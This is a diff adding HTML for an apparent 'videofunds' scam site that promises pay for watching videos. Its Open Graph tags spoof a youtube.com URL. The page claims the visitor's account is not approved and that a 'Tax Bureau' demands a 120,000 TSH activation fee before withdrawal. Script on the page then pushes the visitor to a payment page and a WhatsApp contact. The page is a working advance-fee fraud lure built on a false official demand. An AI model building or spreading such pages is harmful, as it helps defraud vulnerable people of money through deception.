@@ -1,0 +1,311 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta property="og:image" content="https://videofunds.top/images/2.png">
+    <meta property="og:title" content="Get paid to enjoy videos 🎥">
+    <meta property="og:description" content="Earn $0.60 for every minute you spend watching!">
+    <meta property="og:url" content="https://youtube.com">
+    <meta property="og:type" content="video">
+    <meta name="author" content="">
+    <title>Preparation for withdrawal of money is in progress.</title>
+
+    <!-- External CSS -->
+    <link rel="stylesheet" href="style.css
+    <link rel="stylesheet" href="css/font.css">
+    <link rel="stylesheet" href="css/main.css?rstr=532909801696">
+    <link href="css/business-frontpage.css?rstr=532909801696" rel="stylesheet">
+
+    <!-- Inline CSS for Custom Styling -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+        }
+
+        .navbar {
+            background-color: #68162e;
+        }
+
+        .navbar-brand {
+            color: blue;
+            font-weight: bold;
+            font-size: 25px;
+        }
+
+        .navbar-nav .nav-link {
+            color: white;
+        }
+
+        .navbar-nav .nav-link:hover {
+            color: #00b3b3;
+        }
+
+        .alert-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .alert-frame {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 120%;
+        }
+
+        .alert-header {
+            background-color: #b43333;
+            color: white;
+            padding: 7px;
+            font-size: 1.5rem;
+            text-align: center;
+            border-radius: 5px;
+            margin-bottom: 15px;
+        }
+
+        .alert-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        .alert-body {
+            padding: 10px;
+            text-align: center;
+        }
+
+        .alert-message {
+            font-size: 1rem;
+            margin-bottom: 20px;
+        }
+
+        .question-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .confirm-button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            font-size: 1rem;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .confirm-button:hover {
+            background-color: #218838;
+        }
+
+        footer {
+            background-color: #343a40;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        .btn-danger {
+            background-color: #dc3545;
+            border-color: #dc3545;
+        }
+
+        .btn-danger:hover {
+            background-color: #c82333;
+            border-color: #bd2130;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-expand-lg fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="./">
+                <font class="font9" style="font-weight:bold;font-size:50px;color:blue;">videofunds</font>
+            </a>
+            <div class="navbar navbar-expand-lg fixed-right">
+                <a class='nav-link' href='/'>
+                    <div class="fa-address-card"> User area</div>
+                </a>
+            </div>
+           
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Header -->
+   <a style:place-items: center;> <header class="py-1 mb-1 mt-3">
+        <div class="container h-100">
+            <div class="row h-100 align-items-center">
+                <div class="col-lg-12 mt-0 text-center">
+                    <font class="font9" style="font-size:1.8rem;font-weight:bold;color:#18610A;">Preparation for withdrawal of money is in progress.</font>
+                </div>
+            </div>
+        </div>
+    </header> </a>
+<h1 align="center">
+    <div class="container">
+        <div class="row">
+            <div class="col-12 mb-2 text-center">
+                <font class="font9" style="font-size:1.2rem;font-weight:bold;color:blue;">Dear user</font>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-12 mb-2 text-center">
+                <font class="font9" style="font-size:1.3rem;font-weight:bold;color:blue;">
+                    <font color="red">Your account is not approved.</font><br>
+                    <span id="tax1">The Tax Bureau requires that you need to pay 120,000/-TSH  for activation process inorder to Withdraw  money</span><br> and immediately receive money<br>
+                </font>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-12 mb-2 text-center">
+                <div style="font-size: 30px">
+                <button id="chooseTaxPaymentMethod" class="btn-danger" >Pay activation fees</button>
+            </div>
+        </div>
+    </div>
+    </div>
+</h1>
+    <footer class="py-5 bg-dark">
+        <div class="container">
+            <p class="m-0 text-center text-white">Copyright &copy; videofunds.top 2007-2025</p>
+        </div>
+    </footer>
+
+    <script>
+        // Define the cuteAlert function
+        function cuteAlert({
+            type,
+            title,
+            message,
+            confirmText
+        }) {
+            return new Promise((resolve) => {
+                const alertTemplate = `
+          <div class="alert-wrapper">
+            <div class="alert-frame">
+              <div class="alert-header">${title}</div>
+              <span class="alert-close">×</span>
+              <div class="alert-body">
+                <p class="alert-message">${message}</p>
+                <div class="question-buttons">
+                  <button class="confirm-button">${confirmText}</button>
+                </div>
+              </div>
+            </div>
+          </div>`;
+
+                // Insert the alert into the DOM
+                document.body.insertAdjacentHTML("beforeend", alertTemplate);
+
+                // Add the event listener for the confirm button
+                document.querySelector(".confirm-button").addEventListener("click", () => {
+                    document.querySelector(".alert-wrapper").remove(); // Remove the alert
+                    resolve("confirm");
+                    // Redirect the user after the confirmation
+                    window.location.href = "6last payment.html";
+                });
+
+                // Add the event listener for the close button (×)
+                document.querySelector(".alert-close").addEventListener("click", () => {
+                    document.querySelector(".alert-wrapper").remove();
+                });
+            });
+        }
+
+        // Add an event listener for the button that triggers the alert
+        document.getElementById("chooseTaxPaymentMethod").addEventListener("click", () => {
+            cuteAlert({
+                type: "question",
+                title: "PAYMENT INSTRUCTION",
+                message: "Click  the pay activation bottom below and follow the payment instructions to pay and  activate your account according to your network.",
+                confirmText: "Pay activation"
+            });
+        });
+    </script>
+
+</body>
+
+</html>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        /* WhatsApp Button Style */
+
+        .whatsapp-button {
+            position: fixed;
+            /* Keeps the button fixed while scrolling */
+            left: 10px;
+            /* Adjust the distance from the left side */
+            bottom: 10px;
+            /* Adjust the distance from the bottom */
+            z-index: 1000;
+            /* Ensures the button is above other elements */
+            background-color: #25D366;
+            /* WhatsApp green color */
+            padding: 10px;
+            border-radius: 30px;
+            /* Makes the button circular */
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            transition: transform 0.3s ease;
+        }
+
+        /* WhatsApp Icon inside the Button */
+
+        .whatsapp-button img {
+            width: 30px;
+            height: 30px;
+        }
+
+        /* Hover effect */
+
+        .whatsapp-button:hover {
+            transform: scale(1.1);
+            /* Slightly enlarge the button on hover */
+        }
+    </style>
+</head>
+
+<body>
+ <!-- WhatsApp Button -->
+    <a href="https://wa.me/message/E6TSHPIIATXPG1" target="_blank" class="whatsapp-button" title="Chat with us on WhatsApp">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
+    </a>
+
+
+</body>
+
+</html>
+</div>
